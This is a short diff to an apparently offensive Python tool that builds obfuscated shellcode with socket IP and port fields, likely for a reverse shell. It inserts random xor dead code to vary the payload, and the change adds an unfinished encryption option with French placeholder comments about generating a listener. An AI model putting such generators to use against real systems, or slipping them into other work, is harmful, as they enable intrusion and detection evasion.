@@ -146,7 +146,7 @@ def oprand(preshellcode_reg1_reg2: dict, xor_nb: int) -> str:
     baseshell_modified = '0f05'.join(blocs) + '0f05'
     return baseshell_modified
 
-def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int, outfile: str) -> str:
+def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int, outfile: str, iscrypt: bool, key:str) -> str:
     """
     Function that create the shellcode.
     This function call regreplace() and oprand() to do it.
@@ -159,11 +159,18 @@ def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int, outfile: 
         xor_nb (int): Number of xor operation to put
     """
 
-    # replace the registry to handle fd
-    shellcode_dict = regreplace(baseshell)
+    shellcode_dict = ""
+    random_baseshell = ""
 
-    # append dead code to the shellcode
-    random_baseshell = oprand(shellcode_dict, xor_nb)
+    if iscrypt :
+        # à faire les xor et le dictionnaire pour le iscrypt
+        print("FAIRE LES FONCTION DE XOR ET DICO POUR LE CRYPT SHELL ET GENERER LE LISTENER")
+    else:
+        # replace the registry to handle fd
+        shellcode_dict = regreplace(baseshell)
+
+        # append dead code to the shellcode
+        random_baseshell = oprand(shellcode_dict, xor_nb)
 
     # put the ip and port bloc for the socket struct
     delimvalues = {'ip': ipbloc, 'port': portbloc}
